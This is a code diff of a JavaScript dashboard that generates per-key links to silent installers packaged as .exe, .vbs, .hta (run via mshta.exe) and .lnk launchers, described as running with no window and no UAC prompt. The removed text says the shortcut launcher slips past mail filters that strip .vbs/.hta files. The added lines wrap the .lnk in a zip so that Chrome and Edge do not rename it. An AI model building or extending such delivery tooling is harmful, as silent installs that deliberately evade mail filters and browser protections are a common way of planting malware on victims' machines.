@@ -1373,11 +1373,11 @@ async function loadKeys() {
         acts.appendChild(mkCopy('Copy .exe link', k.downloadUrl, 'Share with the customer. Downloads the installer (.exe); they double-click and it installs silently.'));
         acts.appendChild(mkCopy('Copy .vbs link', vbsUrl, 'Share with the customer. Silent one-click: downloads and installs with no window at all.'));
         acts.appendChild(mkCopy('Copy .hta link', htaUrl, 'Share with the customer. Silent one-click via mshta.exe: no console window, no UAC flash.'));
-        acts.appendChild(mkCopy('Copy .lnk link', lnkUrl, 'Share with the customer. Windows shortcut that silently downloads and runs the installer. Slips past some mail filters that strip .vbs/.hta.'));
+        acts.appendChild(mkCopy('Copy .lnk link', lnkUrl, 'Share with the customer. Downloads a tiny .zip; they right-click → Extract All → double-click the .lnk inside. Shortcut silently downloads and runs the installer. The zip wrap is needed because Chrome/Edge rename bare .lnk downloads.'));
         acts.appendChild(mkDl('Download .exe', k.downloadUrl, true, 'Download the installer file yourself.'));
         acts.appendChild(mkDl('Download .vbs', vbsUrl, false, 'Download the silent launcher file yourself.'));
         acts.appendChild(mkDl('Download .hta', htaUrl, false, 'Download the silent HTA launcher file yourself.'));
-        acts.appendChild(mkDl('Download .lnk', lnkUrl, false, 'Download the Windows shortcut launcher yourself.'));
+        acts.appendChild(mkDl('Download .lnk (zip)', lnkUrl, false, 'Download the Windows shortcut launcher yourself. Comes as a .zip because Chrome/Edge rename bare .lnk downloads; extract to get the shortcut.'));
       } else {
         acts.innerHTML = '<span class="tag revoked">Revoked</span>';
       }
